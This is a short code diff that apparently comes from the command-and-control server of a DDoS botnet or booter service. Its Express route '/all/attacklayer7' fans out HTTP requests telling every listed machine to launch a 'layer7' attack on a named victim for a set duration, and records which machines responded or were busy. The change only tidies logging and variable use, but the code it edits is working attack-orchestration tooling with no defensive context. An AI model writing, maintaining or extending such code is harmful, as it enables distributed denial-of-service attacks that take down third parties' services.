@@ -540,21 +540,17 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
         responded: [],
         busy: []
     }
-    console.log(machines);
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
-        console.log(currentMachine);
-        console.log(currentMachine.id);
-        console.log(currentMachine["id"]);
-        machines.asked.push((machines.all)[index])
-        axios.get(`http://${(machines.all)[index].id}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        machines.asked.push(currentMachine)
+        axios.get(`http://${currentMachine.id}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
-                machines.responded.push((machines.all)[index])
+                machines.responded.push(currentMachine)
             })
             .catch(err => {
                 console.error(err.response.data);
-                machines.busy.push((machines.all)[index])
+                machines.busy.push(currentMachine)
             })
     }
     await delay(3000)
